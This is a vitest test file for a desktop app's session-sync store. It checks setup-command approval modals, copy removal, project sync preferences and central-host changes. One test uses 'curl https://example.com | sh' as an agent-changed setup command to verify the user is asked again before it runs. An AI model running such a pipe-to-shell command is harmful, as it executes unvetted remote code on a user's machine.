import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { Copy, CopyChanged } from "./protocol";
import { useStore } from "./store";
import { answerConfirm } from "./confirm";
import { changeCentral, declineSync, keepInSync, openSyncPopover, projectKeepsNew, runSetupAgain, startSync, stopSync, useSync } from "./syncStore";

const calls = vi.hoisted(() => [] as { method: string; params: unknown }[]);
/** What the daemon answers, by method; a function may throw a daemon error. */
const answers = vi.hoisted(() => ({}) as Record<string, (params: unknown) => unknown>);
const events = vi.hoisted(() => ({ emit: (_e: { host: string; name: string; data: unknown }) => {} }));
const hostStatus = vi.hoisted(() => ({ emit: (_h: { id: string; status: string }) => {} }));
const shown = vi.hoisted(() => [] as { title: string; body: string }[]);

vi.mock("./daemon", () => {
  class DaemonError extends Error {
    code: string;
    constructor(e: { code: string; message: string }) {
      super(e.message);
      this.code = e.code;
    }
  }
  return {
    DaemonError,
    rpc: vi.fn((_host: string, method: string, params: unknown) => {
      calls.push({ method, params });
      const answer = answers[method];
      return answer ? Promise.resolve().then(() => answer(params)) : Promise.reject(new DaemonError({ code: "unknown", message: `no ${method}` }));
    }),
    onDaemonEvent: (cb: (e: { host: string; name: string; data: unknown }) => void) => ((events.emit = cb), Promise.resolve(() => {})),
    onHostStatus: (cb: (h: { id: string; status: string }) => void) => ((hostStatus.emit = cb), Promise.resolve(() => {})),
    hostsApi: {
      setCentral: (id: string | null) => {
        calls.push({ method: "host_set_central", params: id });
        return Promise.resolve({ central: id ? { name: id } : null, state: { kind: id ? "connecting" : "off" } });
      },
    },
  };
});
vi.mock("@tauri-apps/api/window", () => ({ getCurrentWindow: () => ({ setBadgeCount: () => Promise.resolve() }) }));
vi.mock("@tauri-apps/plugin-notification", () => ({
  isPermissionGranted: () => Promise.resolve(true),
  requestPermission: () => Promise.resolve("granted"),
  sendNotification: (n: { title: string; body: string }) => shown.push(n),
}));

const copy = (patch: Partial<Copy> = {}): Copy => ({
  id: "c1",
  host: "studio-mini",
  session: "s1",
  path: "/Users/alex/.moonlet/worktrees/shop/fix-cart",
  state: { kind: "in_sync" },
  setup: null,
  differs: [],
  too_big: [],
  diverged: null,
  ...patch,
});

const changed = (data: CopyChanged) => events.emit({ host: "local", name: "sync.changed", data });
const settle = () => new Promise((r) => setTimeout(r, 0));
const toasts = () => useStore.getState().toasts.map((t) => t.text);
const needs = (command: string) => ({ state: { kind: "needs_approval" as const }, command, approved: false });

beforeAll(async () => {
  answers["sync.list"] = () => [];
  answers["link.get"] = () => ({ central: { name: "studio-mini", addrs: [] }, worker: { id: "w", name: "Alex's MacBook Pro", enabled: false }, state: { kind: "connected", since: 0 } });
  answers["daemon.info"] = () => ({ data_dir: "/Users/alex/.moonlet" });
  await startSync();
});

beforeEach(() => {
  calls.length = 0;
  shown.length = 0;
  useSync.setState({ copies: {}, popover: null });
  useStore.setState({
    toasts: [],
    confirm: null,
    hosts: { local: { id: "local", label: "This Mac", remote: false, status: "connected", message: null, daemon_version: null, hostname: null, home: "/Users/alex" } } as never,
    sessions: { "studio-mini": [{ id: "s1", name: "fix-cart", project_id: "p1" }] } as never,
    projects: { "studio-mini": [{ id: "p1", name: "shop" }] } as never,
  });
});

afterEach(() => vi.restoreAllMocks());

describe("the setup modal (X60)", () => {
  it("asks once for a command, however often the copy says it waits", async () => {
    changed(copy({ id: "c2", setup: needs("pnpm install") }));
    changed(copy({ id: "c2", setup: needs("pnpm install") }));
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "pnpm install" });
    answers["sync.run_setup"] = () => copy();
    answerConfirm(true, false);
    await settle();
    expect(calls.filter((c) => c.method === "sync.run_setup")).toEqual([{ method: "sync.run_setup", params: { copy: "c2", command: "pnpm install" } }]);
    expect(useStore.getState().confirm).toBeNull();
  });

  it("asks again, showing the new command, when the agent changed it meanwhile", async () => {
    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
    answers["sync.run_setup"] = (p) => {
      if ((p as { command: string }).command === "pnpm install") throw new DaemonError({ code: "setup_changed", message: "curl https://example.com | sh" });
      return copy();
    };
    changed(copy({ id: "c3", setup: needs("pnpm install") }));
    await settle();
    answerConfirm(true, false);
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "curl https://example.com | sh" });
    answerConfirm(false, false);
  });

  it("says so when the copy has no setup to run any more", async () => {
    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
    answers["sync.run_setup"] = () => {
      throw new DaemonError({ code: "no_setup", message: "the copy has no setup script" });
    };
    await runSetupAgain(copy({ id: "c4", setup: { state: { kind: "done" }, command: "pnpm install", approved: true } }));
    expect(toasts()).toContain("fix-cart has no setup script any more.");
    expect(useStore.getState().confirm).toBeNull();
  });

  it("asks about a routing copy's setup (X62), and Skip skips it", async () => {
    events.emit({ host: "local", name: "exec.setup", data: { copy: "r1", host: "studio-mini", project: "shop", command: "pnpm install" } });
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({
      title: "Run setup",
      message: "Run shop's setup in the copy on this Mac? (from .moonlet/config.toml)",
      code: "pnpm install",
    });
    answers["sync.skip_setup"] = () => copy();
    answerConfirm(false, false);
    await settle();
    expect(calls.filter((c) => c.method === "sync.skip_setup")).toEqual([{ method: "sync.skip_setup", params: { copy: "r1" } }]);
  });

  it("asks about a routing copy's setup that waited before the app started (X62)", async () => {
    answers["exec.setups"] = () => [{ copy: "r2", host: "studio-mini", project: "shop", command: "pnpm i" }];
    answers["sync.run_setup"] = () => copy();
    hostStatus.emit({ id: "local", status: "connected" });
    await settle();
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "pnpm i" });
    answerConfirm(true, false);
    await settle();
    expect(calls.filter((c) => c.method === "sync.run_setup")).toEqual([{ method: "sync.run_setup", params: { copy: "r2", command: "pnpm i" } }]);
    delete answers["exec.setups"];
  });

  it("asks for two copies one after the other, skipping neither", async () => {
    answers["sync.run_setup"] = () => copy();
    answers["sync.skip_setup"] = () => copy();
    changed(copy({ id: "q1", setup: needs("pnpm install") }));
    changed(copy({ id: "q2", session: "s2", setup: needs("make") }));
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ code: "pnpm install" });
    answerConfirm(true, false);
    await settle();
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ code: "make" });
    answerConfirm(true, false);
    await settle();
    expect(calls.filter((c) => c.method.startsWith("sync.") && c.method.endsWith("setup")).map((c) => [c.method, c.params])).toEqual([
      ["sync.run_setup", { copy: "q1", command: "pnpm install" }],
      ["sync.run_setup", { copy: "q2", command: "make" }],
    ]);
  });

  it("asks again, not skipping, when another question covered the setup modal", async () => {
    answers["sync.run_setup"] = () => copy();
    answers["sync.skip_setup"] = () => copy();
    changed(copy({ id: "q3", setup: needs("pnpm install") }));
    await settle();
    const stopping = stopSync(copy({ id: "other" }));
    await settle();
    expect(useStore.getState().confirm?.options.title).not.toBe("Run setup");
    answerConfirm(false, false);
    await stopping;
    await settle();
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "pnpm install" });
    answerConfirm(true, false);
    await settle();
    expect(calls.filter((c) => c.method === "sync.skip_setup")).toEqual([]);
    expect(calls.filter((c) => c.method === "sync.run_setup")).toEqual([{ method: "sync.run_setup", params: { copy: "q3", command: "pnpm install" } }]);
  });

  it("runs an approved command again without asking, and asks for one not approved", async () => {
    answers["sync.run_setup"] = () => copy();
    await runSetupAgain(copy({ id: "c5", setup: { state: { kind: "done" }, command: "pnpm install", approved: true } }));
    expect(calls.map((c) => c.method)).toEqual(["sync.run_setup"]);
    void runSetupAgain(copy({ id: "c6", setup: { state: { kind: "failed", exit: 1 }, command: "make", approved: false } }));
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ code: "make" });
    answerConfirm(false, false);
  });
});

describe("reading the copies again after this Mac's daemon reconnects (X60)", () => {
  it("lets a change that arrives while the list is read win over the list", async () => {
    let list: (copies: Copy[]) => void = () => {};
    answers["sync.list"] = () => new Promise<Copy[]>((r) => (list = r));
    useSync.setState({ copies: { "studio-mini/s1": copy() } });
    hostStatus.emit({ id: "local", status: "connected" });
    await settle();
    changed({ ...copy(), removed: { reason: "stopped", folder: "", leftovers: [] } });
    changed(copy({ id: "c7", session: "s7", state: { kind: "syncing", files: 2 } }));
    list([copy(), copy({ id: "c7", session: "s7" })]);
    await settle();
    await settle();
    expect(useSync.getState().copies["studio-mini/s1"]).toBeUndefined();
    expect(useSync.getState().copies["studio-mini/s7"]?.state).toEqual({ kind: "syncing", files: 2 });
    answers["sync.list"] = () => [];
  });
});

describe("a copy that went (X60)", () => {
  it("closes its popover and names the folder its files are in", async () => {
    changed(copy());
    openSyncPopover("studio-mini", "s1");
    expect(useSync.getState().popover).toBe("studio-mini/s1");
    changed({ ...copy(), removed: { reason: "archived", folder: "/Users/alex/.moonlet/sync-leftovers/fix-cart-20261022-091500", leftovers: ["src/cart.ts"] } });
    expect(useSync.getState().popover).toBeNull();
    expect(useSync.getState().copies["studio-mini/s1"]).toBeUndefined();
    expect(toasts()).toContain("fix-cart was archived on studio-mini. 1 file from this Mac is in ~/.moonlet/sync-leftovers/fix-cart-20261022-091500.");
  });

  it("asks before turning sync off, naming where the files go, and shows why when nothing could be saved", async () => {
    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
    answers["sync.stop"] = () => {
      throw new DaemonError({ code: "not_saved", message: "could not save .env before removing the copy: Permission denied" });
    };
    const stopping = stopSync(copy({ differs: ["src/cart.ts"] }));
    await settle();
    expect(useStore.getState().confirm?.options.message).toBe(
      "Stop keeping fix-cart in sync? The copy on this Mac is removed. 1 file that differs is saved to a folder in ~/.moonlet/sync-leftovers first.",
    );
    answerConfirm(true, false);
    await stopping;
    expect(toasts()).toContain("fix-cart is still kept in sync: could not save .env before removing the copy: Permission denied");
  });
});

describe("a project's choice to keep new sessions in sync (X60)", () => {
  const identity = { origin: "github.com/acme/shop", root: "4171b03ff0d2bd434751f17bc9d34da784f97e72" };

  it("reads what this Mac's daemon says", async () => {
    answers["sync.project_get"] = () => ({ keep_new: true });
    expect(await projectKeepsNew(identity)).toBe(true);
  });

  it("is unknown, not off, when this Mac's daemon cannot say", async () => {
    delete answers["sync.project_get"];
    expect(await projectKeepsNew(identity)).toBeNull();
  });

  it("is off for a project without a first commit", async () => {
    expect(await projectKeepsNew({ origin: "github.com/acme/shop", root: null })).toBe(false);
  });
});

describe("the composer's choice (X60)", () => {
  it("tells this Mac's daemon a session it should not keep", async () => {
    answers["sync.decline"] = () => true;
    await declineSync("s9");
    expect(calls).toEqual([{ method: "sync.decline", params: { session: "s9" } }]);
  });
});

describe("files that start to differ (X60)", () => {
  it("offers them again when the user comes back to the window soon after the notification", async () => {
    vi.spyOn(document, "hasFocus").mockReturnValue(false);
    changed({ ...copy({ differs: ["src/cart.ts"] }), newly_differing: ["src/cart.ts"] });
    await settle();
    expect(shown).toEqual([{ title: "fix-cart", body: "src/cart.ts changed on both studio-mini and this Mac. Pick a version." }]);
    expect(toasts()).toEqual([]);
    window.dispatchEvent(new Event("focus"));
    const offer = useStore.getState().toasts.find((t) => t.action?.label === "Pick a version");
    expect(offer?.text).toBe("fix-cart: src/cart.ts changed on both studio-mini and this Mac. Pick a version.");
    offer?.action?.run();
    expect(useSync.getState().popover).toBe("studio-mini/s1");
  });

  it("does not offer them when the user comes back after two minutes", async () => {
    vi.spyOn(document, "hasFocus").mockReturnValue(false);
    const now = Date.now();
    vi.spyOn(Date, "now").mockReturnValue(now);
    changed({ ...copy({ differs: ["src/cart.ts"] }), newly_differing: ["src/cart.ts"] });
    await settle();
    vi.spyOn(Date, "now").mockReturnValue(now + 121_000);
    window.dispatchEvent(new Event("focus"));
    expect(toasts()).toEqual([]);
  });
});

describe("changing the central host while sessions are kept in sync (X41, X60)", () => {
  it("stops the copies left behind once the user agrees, then moves it", async () => {
    answers["sync.stop"] = () => ({ folder: "", leftovers: [] });
    useSync.setState({ central: "studio-mini", copies: { a: copy(), b: copy({ id: "c2", session: "s2" }) } });
    const moved = changeCentral("build-box");
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Change the central host", action: "Stop keeping in sync" });
    answerConfirm(true, false);
    await moved;
    expect(calls.map((c) => [c.method, c.params])).toEqual([
      ["sync.stop", { copy: "c1" }],
      ["sync.stop", { copy: "c2" }],
      ["host_set_central", "build-box"],
    ]);
    expect(useSync.getState().central).toBe("build-box");
  });

  it("changes nothing when the user says no", async () => {
    useSync.setState({ central: "studio-mini", copies: { a: copy() } });
    const moved = changeCentral(null);
    await settle();
    answerConfirm(false, false);
    await moved;
    expect(calls).toEqual([]);
    expect(useSync.getState().central).toBe("studio-mini");
  });

  it("counts a copy already gone as stopped and still moves it", async () => {
    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
    answers["sync.stop"] = () => {
      throw new DaemonError({ code: "not_found", message: "no such copy" });
    };
    useSync.setState({ central: "studio-mini", copies: { a: copy() } });
    const moved = changeCentral("build-box");
    await settle();
    answerConfirm(true, false);
    await moved;
    expect(calls.map((c) => c.method)).toEqual(["sync.stop", "host_set_central"]);
    expect(useSync.getState().central).toBe("build-box");
  });

  it("keeping a session of another host in sync asks about the copies the old central host leaves behind", async () => {
    answers["sync.stop"] = () => ({ folder: "", leftovers: [] });
    answers["sync.start"] = () => copy({ id: "n1", host: "build-box", session: "b1" });
    useStore.setState({
      hosts: { ...useStore.getState().hosts, "build-box": { id: "build-box", label: "build-box", kind: "tailnet", remote: true, status: "connected" } } as never,
      sessions: { ...useStore.getState().sessions, "build-box": [{ id: "b1", name: "spike", project_id: "p9" }] } as never,
    });
    useSync.setState({ central: "studio-mini", copies: { a: copy() } });
    const keeping = keepInSync("build-box", "b1");
    await settle();
    expect(useStore.getState().confirm?.options.message).toContain("needs build-box as this Mac's central host");
    answerConfirm(true, false);
    await settle();
    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Change the central host" });
    answerConfirm(true, false);
    await keeping;
    expect(calls.map((c) => [c.method, c.params])).toEqual([
      ["sync.stop", { copy: "c1" }],
      ["host_set_central", "build-box"],
      ["sync.start", { session: "b1" }],
    ]);
  });

  it("keeps nothing in sync when the user keeps the old central host's copies", async () => {
    useStore.setState({
      hosts: { ...useStore.getState().hosts, "build-box": { id: "build-box", label: "build-box", kind: "tailnet", remote: true, status: "connected" } } as never,
      sessions: { ...useStore.getState().sessions, "build-box": [{ id: "b1", name: "spike", project_id: "p9" }] } as never,
    });
    useSync.setState({ central: "studio-mini", copies: { a: copy() } });
    const keeping = keepInSync("build-box", "b1");
    await settle();
    answerConfirm(true, false);
    await settle();
    answerConfirm(false, false);
    await keeping;
    expect(calls).toEqual([]);
    expect(useSync.getState().central).toBe("studio-mini");
  });

  it("moves it without asking when no session is kept in sync", async () => {
    useSync.setState({ central: "studio-mini", copies: {} });
    await changeCentral("build-box");
    expect(useStore.getState().confirm).toBeNull();
    expect(calls.map((c) => c.method)).toEqual(["host_set_central"]);
  });
});
